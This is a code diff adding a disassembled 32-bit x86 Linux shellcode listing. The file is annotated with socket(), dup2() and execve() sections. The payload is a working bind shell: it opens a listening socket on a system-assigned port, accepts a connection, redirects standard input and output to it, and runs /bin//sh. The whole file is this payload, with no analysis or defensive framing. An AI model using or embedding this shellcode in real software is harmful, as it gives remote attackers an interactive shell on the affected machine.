@@ -1,0 +1,36 @@
+---socket()
+00000000  31DB              xor ebx,ebx
+00000002  F7E3              mul ebx
+00000004  B066              mov al,0x66
+00000006  43                inc ebx
+00000007  52                push edx
+00000008  53                push ebx
+00000009  6A02              push byte +0x2
+0000000B  89E1              mov ecx,esp
+0000000D  CD80              int 0x80
+---
+0000000F  52                push edx
+00000010  50                push eax
+00000011  89E1              mov ecx,esp
+00000013  B066              mov al,0x66
+00000015  B304              mov bl,0x4
+00000017  CD80              int 0x80
+---
+00000019  B066              mov al,0x66
+0000001B  43                inc ebx
+0000001C  CD80              int 0x80
+---dup2()
+0000001E  59                pop ecx
+0000001F  93                xchg eax,ebx
+00000020  6A3F              push byte +0x3f
+00000022  58                pop eax
+00000023  CD80              int 0x80
+---execve()
+00000025  49                dec ecx
+00000026  79F8              jns 0x20
+00000028  B00B              mov al,0xb
+0000002A  682F2F7368        push dword 0x68732f2f
+0000002F  682F62696E        push dword 0x6e69622f
+00000034  89E3              mov ebx,esp
+00000036  41                inc ecx
+00000037  CD80              int 0x80
